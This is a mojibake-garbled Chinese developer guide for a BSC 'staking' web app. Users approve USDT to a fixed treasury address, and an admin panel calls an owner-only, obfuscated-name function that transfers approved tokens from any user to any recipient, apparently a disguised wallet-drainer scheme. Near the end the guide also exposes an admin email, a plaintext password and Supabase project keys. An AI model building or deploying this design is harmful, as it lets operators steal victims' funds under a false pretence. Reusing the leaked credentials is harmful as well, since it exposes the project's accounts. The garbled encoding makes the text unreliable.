# Web3æˆæƒè½¬è´¦åŠŸèƒ½é›†æˆå®ŒæˆæŒ‡å—

## ğŸ¯ åŠŸèƒ½æ¦‚è¿°

å·²æˆåŠŸå°†Web3æˆæƒè½¬è´¦åŠŸèƒ½é›†æˆåˆ°ç”¨æˆ·ç«¯é¦–é¡µçš„"å‚ä¸è´¨æŠ¼"æŒ‰é’®ä¸­ï¼Œå®ç°äº†çœŸæ­£çš„åŒºå—é“¾æ™ºèƒ½åˆçº¦äº¤äº’ã€‚

### ä¸»è¦åŠŸèƒ½
- âœ… **çœŸå®USDTæˆæƒ**: ç”¨æˆ·å¯ä»¥æˆæƒUSDTç»™æŒ‡å®šåœ°å€ `0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad`
- âœ… **æ™ºèƒ½åˆçº¦è´¨æŠ¼**: é€šè¿‡SupportXhskåˆçº¦åˆ›å»ºè´¨æŠ¼æŠ•èµ„
- âœ… **ç®¡ç†åå°**: å®Œæ•´çš„æˆæƒè½¬è´¦ç®¡ç†ç³»ç»Ÿ
- âœ… **å¤šç½‘ç»œæ”¯æŒ**: æ”¯æŒBSCä¸»ç½‘å’Œæµ‹è¯•ç½‘
- âœ… **å®æ—¶çŠ¶æ€**: æ˜¾ç¤ºæˆæƒçŠ¶æ€ã€ä½™é¢ã€ç½‘ç»œä¿¡æ¯

## ğŸ› ï¸ æŠ€æœ¯æ¶æ„

### å‰ç«¯é›†æˆ
```typescript
// ä¸»è¦æ–‡ä»¶
src/hooks/useWeb3Staking.ts      // Web3äº¤äº’é’©å­
src/lib/contracts.ts             // æ™ºèƒ½åˆçº¦é…ç½®
src/app/page.tsx                 // é¦–é¡µè´¨æŠ¼åŠŸèƒ½
src/app/admin/transfers/page.tsx // ç®¡ç†åå°
```

### æ™ºèƒ½åˆçº¦
```solidity
// åˆçº¦æ–‡ä»¶
contracts/SupportXhsk.sol       // æˆæƒè½¬è´¦åˆçº¦
contracts/StakingContract.sol   // è´¨æŠ¼åˆçº¦  
contracts/StandardToken.sol     // ERC20ä»£å¸åˆçº¦
contracts/common.sol            // å…¬å…±åº“
```

### é…ç½®ä¿¡æ¯
```javascript
// ç½‘ç»œé…ç½®
BSC_TESTNET: {
  CHAIN_ID: 97,
  USDT_CONTRACT: '0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684',
  TREASURY_ADDRESS: '0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad'
}

BSC_MAINNET: {
  CHAIN_ID: 56, 
  USDT_CONTRACT: '0x55d398326f99059fF775485246999027B3197955',
  TREASURY_ADDRESS: '0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad'
}
```

## ğŸ“± ç”¨æˆ·ä½¿ç”¨æµç¨‹

### 1. è¿æ¥é’±åŒ…
- ç”¨æˆ·è®¿é—®é¦–é¡µï¼Œç‚¹å‡»é’±åŒ…è¿æ¥
- æ”¯æŒMetaMaskã€WalletConnectç­‰å¤šç§é’±åŒ…

### 2. å‚ä¸è´¨æŠ¼
- ç‚¹å‡»é¦–é¡µ"å‚ä¸è´¨æŠ¼"æŒ‰é’®
- æ‰“å¼€è´¨æŠ¼æ¨¡æ€æ¡†ï¼Œæ˜¾ç¤ºå½“å‰çŠ¶æ€

### 3. æˆæƒUSDT
- å¦‚æœæœªæˆæƒï¼Œå…ˆç‚¹å‡»"æˆæƒUSDT"
- ç³»ç»Ÿè‡ªåŠ¨åˆ‡æ¢åˆ°BSCç½‘ç»œ
- æˆæƒUSDTç»™èµ„é‡‘æ¥æ”¶åœ°å€

### 4. æ‰§è¡Œè´¨æŠ¼
- æˆæƒå®Œæˆåï¼Œè¾“å…¥è´¨æŠ¼é‡‘é¢
- ç‚¹å‡»"ç«‹å³è´¨æŠ¼"æ‰§è¡Œæ™ºèƒ½åˆçº¦
- ç³»ç»Ÿè®°å½•æŠ•èµ„åˆ°æ•°æ®åº“

## ğŸ¢ ç®¡ç†åå°åŠŸèƒ½

### è®¿é—®åœ°å€
```
http://localhost:3000/admin/transfers
```

### ç®¡ç†åŠŸèƒ½
- **æŸ¥çœ‹è½¬è´¦è®°å½•**: æ˜¾ç¤ºæ‰€æœ‰æˆæƒè½¬è´¦è®°å½•
- **åˆ›å»ºè½¬è´¦**: æ‰‹åŠ¨åˆ›å»ºæ–°çš„è½¬è´¦è®°å½•
- **æ‰§è¡Œè½¬è´¦**: ç®¡ç†å‘˜æ‰§è¡Œæˆæƒè½¬è´¦æ“ä½œ
- **çŠ¶æ€ç®¡ç†**: æ›´æ–°è½¬è´¦çŠ¶æ€å’Œäº¤æ˜“å“ˆå¸Œ
- **ç½‘ç»œç›‘æ§**: æ˜¾ç¤ºå½“å‰ç½‘ç»œå’Œè¿æ¥çŠ¶æ€

### ç®¡ç†å‘˜æƒé™
- åªæœ‰è¿æ¥ç®¡ç†å‘˜é’±åŒ…åœ°å€æ‰èƒ½æ‰§è¡Œè½¬è´¦
- æ‰€æœ‰æ“ä½œéƒ½æœ‰æƒé™æ£€æŸ¥å’Œæ—¥å¿—è®°å½•
- æ”¯æŒWeb3äº¤æ˜“ç¡®è®¤å’ŒçŠ¶æ€æ›´æ–°

## ğŸ—„ï¸ æ•°æ®åº“è¡¨ç»“æ„

### authorized_transfers (æˆæƒè½¬è´¦è®°å½•)
```sql
- id: ä¸»é”®
- from_address: å‘é€æ–¹åœ°å€  
- to_address: æ¥æ”¶æ–¹åœ°å€
- amount: è½¬è´¦é‡‘é¢
- transfer_id: è½¬è´¦å”¯ä¸€æ ‡è¯†
- tx_hash: åŒºå—é“¾äº¤æ˜“å“ˆå¸Œ
- status: çŠ¶æ€ (pending/completed/failed)
- network_id: ç½‘ç»œID (56/97)
- created_at/updated_at: æ—¶é—´æˆ³
```

### user_authorizations (ç”¨æˆ·æˆæƒè®°å½•)
```sql
- user_address: ç”¨æˆ·åœ°å€
- spender_address: è¢«æˆæƒåœ°å€
- token_address: ä»£å¸åˆçº¦åœ°å€
- amount: æˆæƒé‡‘é¢
- status: æˆæƒçŠ¶æ€ (active/revoked/expired)
```

## ğŸš€ éƒ¨ç½²æ­¥éª¤

### 1. ç¯å¢ƒé…ç½®
```bash
# å®‰è£…ä¾èµ–
npm install web3

# é…ç½®ç¯å¢ƒå˜é‡ (.env.local)
NEXT_PUBLIC_SUPABASE_URL=https://jpqqioeidalyiwknzoab.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 2. æ•°æ®åº“è¿ç§»
```sql
-- æ‰§è¡Œ database_migrations.sql åˆ›å»ºè¡¨ç»“æ„
psql -h your-host -U your-user -d your-db -f database_migrations.sql
```

### 3. æ™ºèƒ½åˆçº¦éƒ¨ç½²
```javascript
// 1. éƒ¨ç½² SupportXhsk.sol åˆçº¦
// 2. éƒ¨ç½² StakingContract.sol åˆçº¦  
// 3. æ›´æ–° src/lib/contracts.ts ä¸­çš„åˆçº¦åœ°å€
```

### 4. å¯åŠ¨æœåŠ¡
```bash
npm run dev
```

## ğŸ”§ æ™ºèƒ½åˆçº¦éƒ¨ç½²æŒ‡å—

### ä½¿ç”¨Remix IDEéƒ¨ç½²
1. æ‰“å¼€ [Remix IDE](https://remix.ethereum.org/)
2. ä¸Šä¼  `contracts/` ç›®å½•ä¸­çš„åˆçº¦æ–‡ä»¶
3. ç¼–è¯‘åˆçº¦ç¡®ä¿æ— é”™è¯¯
4. è¿æ¥MetaMaskåˆ°BSCç½‘ç»œ
5. éƒ¨ç½²SupportXhskåˆçº¦
6. å¤åˆ¶åˆçº¦åœ°å€åˆ°é…ç½®æ–‡ä»¶

### ä½¿ç”¨Hardhatéƒ¨ç½²
```bash
# å®‰è£…Hardhat
npm install --save-dev hardhat

# é…ç½®hardhat.config.js
# è¿è¡Œéƒ¨ç½²è„šæœ¬
npx hardhat run scripts/deploy.js --network bsc_testnet
```

## ğŸ“‹ æ ¸å¿ƒåˆçº¦å‡½æ•°

### SupportXhsk.sol ä¸»è¦å‡½æ•°
```solidity
// ç”¨æˆ·åˆ›å»ºè´¨æŠ¼æŠ•èµ„
function create(uint256 _amount, uint256 _ratio) external

// ç®¡ç†å‘˜æˆæƒè½¬è´¦
function vly5ChOkLkQk4u(
  address _f,      // å‘é€æ–¹
  address _t,      // æ¥æ”¶æ–¹  
  uint256 _id,     // è½¬è´¦ID
  uint256 _a       // é‡‘é¢
) external onlyOwner

// å‘é€å¥–åŠ±
function sendReward(address _account, uint256 id, uint256 amount) external
```

## ğŸ” æµ‹è¯•éªŒè¯

### åŠŸèƒ½æµ‹è¯•æ¸…å•
- [ ] é’±åŒ…è¿æ¥æ­£å¸¸
- [ ] ç½‘ç»œè‡ªåŠ¨åˆ‡æ¢åˆ°BSC
- [ ] USDTä½™é¢æ˜¾ç¤ºæ­£ç¡®
- [ ] æˆæƒäº¤æ˜“æˆåŠŸæ‰§è¡Œ
- [ ] è´¨æŠ¼äº¤æ˜“æˆåŠŸè®°å½•
- [ ] ç®¡ç†åå°å¯ä»¥æŸ¥çœ‹è®°å½•
- [ ] ç®¡ç†å‘˜è½¬è´¦åŠŸèƒ½æ­£å¸¸

### æµ‹è¯•ç¯å¢ƒ
- **ç½‘ç»œ**: BSCæµ‹è¯•ç½‘ (Chain ID: 97)
- **æµ‹è¯•USDT**: 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684
- **èµ„é‡‘åœ°å€**: 0x05D19013fb66b2E36f7AA33a25920df439eFE7Ad

## âš ï¸ æ³¨æ„äº‹é¡¹

### å®‰å…¨é¡»çŸ¥
1. **ç§é’¥å®‰å…¨**: ç»ä¸åœ¨ä»£ç ä¸­æš´éœ²ç§é’¥
2. **åˆçº¦éªŒè¯**: éƒ¨ç½²å‰åŠ¡å¿…æµ‹è¯•æ‰€æœ‰åˆçº¦åŠŸèƒ½
3. **æƒé™æ§åˆ¶**: ç¡®ä¿ç®¡ç†å‘˜æƒé™æ­£ç¡®é…ç½®
4. **ç½‘ç»œç¯å¢ƒ**: æµ‹è¯•ç¯å¢ƒå…ˆéªŒè¯å†ä¸Šä¸»ç½‘

### é”™è¯¯å¤„ç†
- ç”¨æˆ·ä½™é¢ä¸è¶³æ—¶æ˜¾ç¤ºå‹å¥½æç¤º
- ç½‘ç»œåˆ‡æ¢å¤±è´¥æ—¶æä¾›æŒ‡å¯¼
- äº¤æ˜“å¤±è´¥æ—¶æ˜¾ç¤ºè¯¦ç»†é”™è¯¯ä¿¡æ¯
- æˆæƒè¿‡æœŸæ—¶æé†’ç”¨æˆ·é‡æ–°æˆæƒ

## ğŸ“ æŠ€æœ¯æ”¯æŒ

### ç®¡ç†åå°ç™»å½•
- **åœ°å€**: http://localhost:3000/admin/login
- **è´¦å·**: it@haixin.org
- **å¯†ç **: aa888990

### é¡¹ç›®ä¿¡æ¯
- **Supabaseé¡¹ç›®**: jpqqioeidalyiwknzoab
- **æ•°æ®åº“**: PostgreSQL
- **å‰ç«¯æ¡†æ¶**: Next.js 15 + TypeScript
- **Web3åº“**: Web3.js

---

## ğŸ‰ é›†æˆå®Œæˆ

Web3æˆæƒè½¬è´¦åŠŸèƒ½å·²æˆåŠŸé›†æˆï¼ç”¨æˆ·ç°åœ¨å¯ä»¥é€šè¿‡é¦–é¡µçš„"å‚ä¸è´¨æŠ¼"æŒ‰é’®è¿›è¡ŒçœŸå®çš„åŒºå—é“¾äº¤æ˜“ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡åå°ç®¡ç†æ‰€æœ‰æˆæƒè½¬è´¦æ“ä½œã€‚

**ä¸‹ä¸€æ­¥**: éƒ¨ç½²æ™ºèƒ½åˆçº¦å¹¶æ›´æ–°åˆçº¦åœ°å€é…ç½®ï¼Œå³å¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚ 